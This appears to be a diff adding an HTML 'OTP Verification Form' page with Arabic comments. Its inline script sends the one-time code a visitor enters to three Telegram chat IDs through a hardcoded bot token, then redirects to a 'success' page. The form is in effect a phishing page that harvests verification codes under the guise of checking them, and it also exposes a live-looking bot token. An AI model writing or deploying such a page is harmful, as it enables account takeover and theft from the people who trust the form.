@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - codingnepalweb.com -->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+   <title>OTP Verification Form</title>
+    <link rel="stylesheet" href="css/style1.css" />
+    <!-- Boxicons CSS -->
+    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+   <script src="script.js" defer></script>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <i class="bx bxs-check-shield"></i>
+      </header>
+      <h4>Enter OTP Code</h4>
+      <form id="otpForm" action="scc.html">
+        <div class="input-field">
+            <input type="number" id="otp1" maxlength="1" required />
+            <input type="number" id="otp2" maxlength="1" required disabled />
+            <input type="number" id="otp3" maxlength="1" required disabled />
+            <input type="number" id="otp4" maxlength="1" required disabled />
+        </div>
+        <button type="submit">Verify OTP</button>
+    </form>
+    
+    <script>
+        document.getElementById('otpForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // منع إعادة تحميل الصفحة
+    
+            // جمع بيانات OTP
+            let otp1 = document.getElementById('otp1').value;
+            let otp2 = document.getElementById('otp2').value;
+            let otp3 = document.getElementById('otp3').value;
+            let otp4 = document.getElementById('otp4').value;
+    
+            let otpCode = otp1 + otp2 + otp3 + otp4; // دمج أرقام OTP
+    
+            // توكن البوت الخاص بك
+            let token = '7521797677:AAGIFwrI5EW89pLrEWNEXzBP4324G9ecDvg';
+    
+            // معرفات الدردشة
+            let chat_ids = ['6499428446', '6335940131', '722250396'];
+    
+            // الرسالة التي سيتم إرسالها
+            let message = `تم إدخال كود OTP: ${otpCode}`;
+    
+            // إرسال الرسالة إلى كل معرف دردشة
+            chat_ids.forEach(chat_id => {
+                let url = `https://api.telegram.org/bot${token}/sendMessage`;
+    
+                // إرسال الطلب إلى API تلغرام
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('تم الإرسال بنجاح', data);
+    
+                    // تحويل المستخدم إلى صفحة scc.html بعد النجاح
+                    window.location.href = "scc.html";
+                })
+                .catch(error => {
+                    console.error('حدث خطأ أثناء الإرسال:', error);
+                });
+            });
+        });
+    </script>
+    
+    </div>
+  </body>
+</html>
